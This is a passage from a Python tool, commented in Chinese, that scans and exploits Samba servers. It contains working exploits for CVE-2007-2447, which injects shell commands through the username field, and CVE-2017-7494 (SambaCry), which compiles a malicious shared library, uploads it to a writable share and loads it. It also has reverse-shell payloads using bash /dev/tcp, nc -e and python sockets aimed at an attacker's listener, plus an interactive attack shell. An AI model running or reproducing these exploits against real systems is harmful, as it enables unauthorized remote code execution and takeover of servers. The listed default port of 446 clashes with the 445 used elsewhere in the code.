    safe_print(f"\n{C.CYN}[*] smbclient 详细枚举{C.RST}")
    try:
        r = subprocess.run(['smbclient', '-L', f'//{host}', '-N', '-g'],
                           capture_output=True, text=True, timeout=timeout)
        for line in r.stdout.split('\n'):
            if 'Disk|' in line:
                parts = line.split('|')
                if len(parts) >= 3:
                    name, comment = parts[1].strip(), parts[2].strip() if len(parts) > 2 else ''
                    results.append(f'{name} [DISK] {comment}')
                    safe_print(f"  {C.GRN}[+] {name} [DISK] {comment}{C.RST}")
    except Exception:
        pass
    return results


# ===================== 利用函数 =====================

def exploit_cve_2007_2447(host: str, command: str, port: int = 445, timeout: float = 10) -> Optional[str]:
    safe_print(f"\n{C.BLD}[CVE-2007-2447] 命令执行: {command}{C.RST}\n")
    conn = SMBConnection(host, port, timeout)
    if not conn.connect():
        return None
    if not conn.smb1_negotiate():
        conn.close()
        safe_print(f"{C.RED}[-] 需要 SMB1{C.RST}")
        return None

    user = f'/=`nohup {command}`'
    safe_print(f"  {C.CYN}[*] 注入: /=`nohup {command}`{C.RST}")
    resp = conn.smb1_session_setup_raw(user)
    conn.close()

    if resp:
        status = struct.unpack('<I', resp[9:13])[0] if len(resp) >= 34 else 0
        safe_print(f"  NTSTATUS: 0x{status:08X}")
        safe_print(f"{C.GRN}[+] 命令已发送 (blind RCE){C.RST}")
        return f"已发送 (STATUS 0x{status:08X})"
    return None


def exploit_cve_2007_2447_reverse(host: str, lhost: str, lport: int,
                                   port: int = 445, timeout: float = 10) -> bool:
    safe_print(f"\n{C.BLD}[CVE-2007-2447] 反弹 Shell → {lhost}:{lport}{C.RST}\n")
    payloads = [
        f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &',
        f'nohup nc -e /bin/bash {lhost} {lport} &',
        f'nohup python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{lhost}\',{lport}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call([\'/bin/sh\',\'-i\'])" &',
    ]
    for i, pl in enumerate(payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}/{len(payloads)}{C.RST}")
        exploit_cve_2007_2447(host, pl, port, timeout)
    safe_print(f"\n{C.GRN}{'=' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'=' * 50}{C.RST}")
    return True


def exploit_cve_2017_7494(host: str, command: str, port: int = 445, timeout: float = 10) -> Optional[str]:
    safe_print(f"\n{C.BLD}[CVE-2017-7494 SambaCry] 命令: {command}{C.RST}\n")
    if not _check_cmd('smbclient') or not _check_cmd('gcc'):
        safe_print(f"{C.RED}[-] 需要 smbclient + gcc{C.RST}")
        return None

    # 找可写共享
    rk = randstr(6)
    writable = None
    conn = SMBConnection(host, port, timeout)
    if conn.connect() and conn.smb1_negotiate():
        resp = conn.smb1_session_setup_raw('')
        if resp and struct.unpack('<I', resp[9:13])[0] == 0:
            conn.user_id = struct.unpack('<H', resp[32:34])[0]
            for s in ['tmp', 'public', 'share', 'Shared', 'data', 'home', 'IPC$']:
                if conn.smb1_tree_connect(f'\\\\{host}\\{s}'):
                    writable = s
                    break
        conn.close()

    if not writable:
        safe_print(f"{C.RED}[-] 未发现可访问共享 (需 NULL Session){C.RST}")
        return None

    safe_print(f"  {C.GRN}[+] 目标共享: {writable}{C.RST}")

    # .so payload
    so_name = f'libkkfv_{rk}.so'
    c_code = f'int samba_init_module(void) {{ system("{command}"); return 0; }}'
    c_path = f'/tmp/kkfv_sambacry_{rk}.c'
    so_path = f'/tmp/{so_name}'

    try:
        with open(c_path, 'w') as f:
            f.write(c_code)
        subprocess.run(['gcc', '-shared', '-fPIC', '-o', so_path, c_path],
                       capture_output=True, timeout=30, check=True)

        # 上传
        subprocess.run(['smbclient', f'//{host}/{writable}', '-N',
                        '-c', f'put {so_path} {so_name}'],
                       capture_output=True, timeout=30, check=True)

        safe_print(f"  {C.GRN}[+] .so 已上传: {so_name}{C.RST}")
        safe_print(f"  {C.CYN}[*] 触发加载...{C.RST}")

        # 触发
        conn2 = SMBConnection(host, port, timeout)
        if conn2.connect() and conn2.smb1_negotiate():
            resp = conn2.smb1_session_setup_raw('')
            if resp and struct.unpack('<I', resp[9:13])[0] == 0:
                conn2.user_id = struct.unpack('<H', resp[32:34])[0]
                conn2.smb1_tree_connect(f'\\\\{host}\\IPC$')
                for pipe_base in [f'/home/{writable}/{so_name}',
                                  f'/tmp/{so_name}',
                                  f'/var/tmp/{so_name}']:
                    pipe_name = pipe_base.encode('utf-16-le')
                    smb_hdr = b'\xffSMB\xa2' + struct.pack('<I', 0) + b'\x18\x01\x80' + \
                              b'\x00'*10 + struct.pack('<H', conn2.tree_id) + b'\x00\x00' + \
                              struct.pack('<H', conn2.user_id) + b'\x06\x00'
                    params = struct.pack('<BBHH', 24, 0xFF, 0, 0) + b'\x00' + \
                             struct.pack('<H', len(pipe_name)) + b'\x00'*4 + \
                             struct.pack('<Q', 0) + b'\x02\x00' + b'\x00'*8 + \
                             b'\x80\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x00' + b'\x00'*8
                    try:
                        conn2._netbios_send(smb_hdr + params + pipe_name)
                        conn2._netbios_recv()
                    except Exception:
                        pass
            conn2.close()

        safe_print(f"\n{C.GRN}{'=' * 50}{C.RST}")
        safe_print(f"{C.BLD}Payload 已触发{C.RST}")
        safe_print(f"{C.GRN}{'=' * 50}{C.RST}")
        return f'已触发 ({so_name} @ {writable})'
    except Exception as e:
        safe_print(f"{C.RED}[-] 错误: {e}{C.RST}")
        return None
    finally:
        for f in [c_path]:
            if os.path.exists(f):
                os.unlink(f)


# ===================== 交互式 Shell =====================

def interactive_shell(host: str, port: int, timeout: float):
    safe_print(f"\n{C.GRN}[+] 交互式 SMB Shell | 目标: {host}:{port}{C.RST}")
    safe_print(f"{C.CYN}    输入 help 查看命令, exit 退出{C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}SMB[{host}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}=== 检测 ==={C.RST}
  {C.GRN}check{C.RST}    综合检测        {C.GRN}ports{C.RST}   端口扫描
  {C.GRN}null{C.RST}     NULL Session     {C.GRN}weak{C.RST}   弱口令检测
  {C.GRN}enum{C.RST}    smbclient 枚举   {C.GRN}ldap{C.RST}   LDAP 信息收集
{C.BLD}=== 利用 ==={C.RST}
  {C.GRN}rce <cmd>{C.RST}        CVE-2007-2447 命令执行
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 shell
  {C.GRN}sambacry <cmd>{C.RST}   CVE-2017-7494 SambaCry
{C.BLD}=== 其他 ==={C.RST}
  {C.GRN}info{C.RST}    目标信息   {C.GRN}smb <args>{C.RST}  调用 smbclient""")
                continue

            if action == 'ports':
                safe_print(f"\n{C.BLD}端口扫描: {host}{C.RST}")
                ports = port_scan(host, 2)
                for p, open_ in ports.items():
                    marker = f"{C.GRN}OPEN{C.RST}" if open_ else f"{C.RED}CLOSED{C.RST}"
                    safe_print(f"  {marker} {p}")
                role = classify_samba_role(ports)
                if role:
                    safe_print(f"\n  {C.BLD}判断角色: {C.RED}{role}{C.RST}")
                continue

            if action == 'check':
                run_all_checks(host, port, timeout, None)
                continue

            if action == 'null':
                check_null_session_enum(host, port, timeout)
                continue

            if action == 'weak':
                check_weak_auth(host, port, timeout)
                continue

            if action == 'enum':
                run_smbclient_enum(host, timeout)
                continue

            if action == 'ldap':
                if probe_port(host, 389, timeout) and _check_cmd('ldapsearch'):
                    safe_print(f"  {C.CYN}[*] LDAP 匿名查询{C.RST}")
                    r = subprocess.run(['ldapsearch', '-H', f'ldap://{host}', '-x', '-s', 'base', '-b', ''],
                                       capture_output=True, text=True, timeout=10)
                    safe_print(r.stdout[:3000])
                else:
                    safe_print(f"  {C.RED}需要 ldapsearch 工具或端口不可达{C.RST}")
                continue

            if action == 'rce':
                if not arg:
                    safe_print(f"  {C.YLW}用法: rce <command>{C.RST}")
                    continue
                exploit_cve_2007_2447(host, arg, port, timeout)
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"  {C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_cve_2007_2447_reverse(host, args_list[0], int(args_list[1]), port, timeout)
                continue

            if action == 'sambacry':
                if not arg:
                    safe_print(f"  {C.YLW}用法: sambacry <command>{C.RST}")
                    continue
                exploit_cve_2017_7494(host, arg, port, timeout)
                continue

            if action == 'info':
                info = detect_samba_version(host, port, timeout)
                safe_print(f"\n{C.BLD}═══ 目标信息 ═══{C.RST}")
                safe_print(f"  SMB 协议 : {info['smb_dialect']}")
                safe_print(f"  系统信息 : {info['native_os']}")
                safe_print(f"  SMB 签名 : {'必需' if info['signing_required'] else '可选/关闭'}")
                safe_print(f"  角色判断 : {info['role']}")
                safe_print(f"  AD DC?   : {'是' if info['is_ad_dc'] else '否'}")
                safe_print(f"\n  {C.BLD}开放端口:{C.RST}")
                for p, open_ in info['ports'].items():
                    if open_:
                        safe_print(f"    {C.GRN}{p}{C.RST}")
                continue

            if action == 'smb':
                arg_list = arg.split() if arg else ['-L', f'//{host}', '-N']
                safe_print(f"  {C.CYN}smbclient {' '.join(arg_list)}{C.RST}")
                try:
                    r = subprocess.run(['smbclient'] + arg_list,
                                       capture_output=True, text=True, timeout=timeout)
                    safe_print(r.stdout[:3000])
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")


# ===================== 主流程 =====================

def run_all_checks(host: str, port: int, timeout: float, args) -> List[str]:
    all_hits: List[str] = []

    # 端口扫描
    ports = port_scan(host, 2)
    role = classify_samba_role(ports)
    safe_print(f"\n{C.BLD}═══ 端口扫描 + 角色判断 ═══{C.RST}")
    for p, open_ in ports.items():
        if open_:
            safe_print(f"  {C.GRN}[OPEN] {p}{C.RST}")
    if role:
        safe_print(f"\n  {C.BLD}角色: {C.RED}{role}{C.RST}\n")

    is_ad_dc = 'AD DC' in role

    # 版本检测
    info = detect_samba_version(host, port, timeout)
    safe_print(f"{C.BLD}SMB 协议: {info['smb_dialect']}{C.RST}")
    safe_print(f"{C.BLD}签名状态: {'必需' if info['signing_required'] else '可选/关闭'}{C.RST}")
    if info['native_os']:
        safe_print(f"{C.BLD}系统信息: {info['native_os']}{C.RST}")

    # SMBv1 风险
    if check_smbv1_risk(host, port, timeout):
        all_hits.append('SMBv1 已启用 (MS17-010 风险)')

    # NULL Session
    null_hits = check_null_session_enum(host, port, timeout)
    if 'NULL_SESSION' in null_hits:
        all_hits.append('NULL Session 空会话可用')
    if 'LDAP_ANONYMOUS' in null_hits:
        all_hits.append('LDAP 匿名绑定 (AD 信息泄露)')

    # CVE-2007-2447 (Samba 3.x 主力)
    hit2447, _ = check_cve_2007_2447(host, port, timeout)
    if hit2447:
        all_hits.append('CVE-2007-2447 username map script RCE')

    # CVE-2012-1182 (Samba 3.x, 仅 --detect-crash)
    if getattr(args, 'detect_crash', False):
        if check_cve_2012_1182(host, port, timeout):
            all_hits.append('CVE-2012-1182 PIDL 堆溢出')

    # CVE-2015-0240 (Samba 3.x~4.2)
    if check_cve_2015_0240(host, port, timeout):
        all_hits.append('CVE-2015-0240 可能 (需确认版本)')

    # CVE-2017-7494 SambaCry
    hit7494, w_shares = check_cve_2017_7494(host, port, timeout)
    if hit7494:
        all_hits.append(f'CVE-2017-7494 SambaCry (共享: {w_shares})')

    # Samba 4 AD DC 专项
    if is_ad_dc:
        safe_print(f"\n{C.CYN}{'─' * 40}{C.RST}")
        safe_print(f"{C.CYN}  Samba 4 AD DC 专项检测{C.RST}")
        safe_print(f"{C.CYN}{'─' * 40}{C.RST}")

        # CVE-2020-1472 ZeroLogon
        if check_cve_2020_1472_zerologon(host, port, timeout):
            all_hits.append('CVE-2020-1472 ZeroLogon 风险 (AD DC)')

        # CVE-2020-25717
        if check_cve_2020_25717(host, port, timeout):
            all_hits.append('CVE-2020-25717 PAC-less 提权 风险')

        # CVE-2021-44142 vfs_fruit
        if check_cve_2021_44142_vfs_fruit(host, port, timeout):
            all_hits.append('CVE-2021-44142 vfs_fruit 风险')

        # CVE-2025-10230 WINS hook
        check_cve_2025_10230(host, 137 if ports.get('137/udp (NetBIOS-NS)') else 137, timeout)

    # CVE-2023-3961 (全版本)
    check_cve_2023_3961(host, port, timeout)

    # 弱口令检测
    weak_hits = check_weak_auth(host, port, timeout)
    for wh in weak_hits:
        all_hits.append(f'弱口令: {wh}')

    # smbclient 枚举
    run_smbclient_enum(host, timeout)

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标     : {host}:{port}")
    safe_print(f"  协议     : {info['smb_dialect']}")
    safe_print(f"  角色     : {role or '未知'}")
    if info['native_os']:
        safe_print(f"  系统     : {info['native_os']}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (配置可能较安全){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()
    parser = argparse.ArgumentParser(
        description='Samba 3.x / 4.x 综合漏洞检测利用工具 v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测 (自动识别 Samba 3/4 角色)
  python samba_check.py -t 192.168.1.100

  # 枚举共享 + LDAP
  python samba_check.py -t 192.168.1.100 enum

  # CVE-2007-2447 命令执行 (Samba 3.x)
  python samba_check.py -t 192.168.1.100 rce --cve 2007-2447 --cmd "whoami"

  # CVE-2007-2447 反弹 shell
  python samba_check.py -t 192.168.1.100 rce --cve 2007-2447 --reverse --lhost 10.0.0.1 --lport 4444

  # CVE-2017-7494 SambaCry
  python samba_check.py -t 192.168.1.100 rce --cve 2017-7494 --cmd "id"

  # 交互式 Shell
  python samba_check.py -t 192.168.1.100 shell

  # 包含可能崩溃的检测 (CVE-2012-1182)
  python samba_check.py -t 192.168.1.100 --detect-crash --timeout 15
        ''',
    )
    parser.add_argument('-t', '--target', required=True, help='目标 IP/域名')
    parser.add_argument('-p', '--port', type=int, default=446, help='SMB 端口 (默认 446)')
    parser.add_argument('--timeout', type=float, default=10, help='超时秒数')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--detect-crash', action='store_true',
                        help='启用可能崩溃的检测 (CVE-2012-1182)')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')
    sub.add_parser('enum', help='共享 + LDAP 枚举')
    rce_p = sub.add_parser('rce', help='远程命令执行')
    rce_p.add_argument('--cve', choices=['2007-2447', '2017-7494'], required=True)
    rce_p.add_argument('--cmd', help='命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 shell')
    rce_p.add_argument('--lhost', help='监听 IP')
    rce_p.add_argument('--lport', type=int, help='监听端口')
    sub.add_parser('shell', help='交互式 Shell')

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    host = args.target
    if args.mode == 'check':
        run_all_checks(host, args.port, args.timeout, args)
    elif args.mode == 'enum':
        check_null_session_enum(host, args.port, args.timeout)
        run_smbclient_enum(host, args.timeout)
    elif args.mode == 'rce':
        if args.cve == '2007-2447':
            if args.reverse:
                exploit_cve_2007_2447_reverse(host, args.lhost, args.lport, args.port, args.timeout)
            elif args.cmd:
                exploit_cve_2007_2447(host, args.cmd, args.port, args.timeout)
            else:
                safe_print(f"{C.RED}需要 --cmd 或 --reverse{C.RST}")
        elif args.cve == '2017-7494':
            if args.cmd:
                exploit_cve_2017_7494(host, args.cmd, args.port, args.timeout)
            else:
                safe_print(f"{C.RED}需要 --cmd{C.RST}")
    elif args.mode == 'shell':
        interactive_shell(host, args.port, args.timeout)
    safe_print("")


if __name__ == '__main__':
    main()
